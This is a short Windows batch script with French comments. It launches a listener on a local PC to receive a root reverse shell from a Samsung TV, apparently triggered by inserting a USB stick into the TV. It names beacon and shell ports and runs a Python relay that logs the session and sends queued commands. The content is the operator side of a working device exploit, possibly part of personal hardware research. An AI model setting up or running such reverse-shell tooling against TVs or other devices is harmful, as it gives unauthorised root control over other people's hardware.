@echo off
REM Listener pour le reverse shell TV (beacon port 4444, shell port 4445)
REM Lancer AVANT de brancher la cle USB dans la TV

echo ============================================
echo   Listener Root Shell - Samsung TV Exploit
echo ============================================
echo.
echo Ce PC: 192.168.1.29
echo Beacon: port 4444 (signal de connexion)
echo Shell:  port 4445 (reverse shell root)
echo.
echo En attente de la TV...
echo (branche la cle USB dans la TV maintenant)
echo.

cd /d "C:\Users\theor\Documents\TV\exploit"
".venv\Scripts\python.exe" lab\relay_shell_4445.py --bind 0.0.0.0 --port 4445 --log "%~dp0shell.log" --commands "%~dp0shell_cmds.txt"
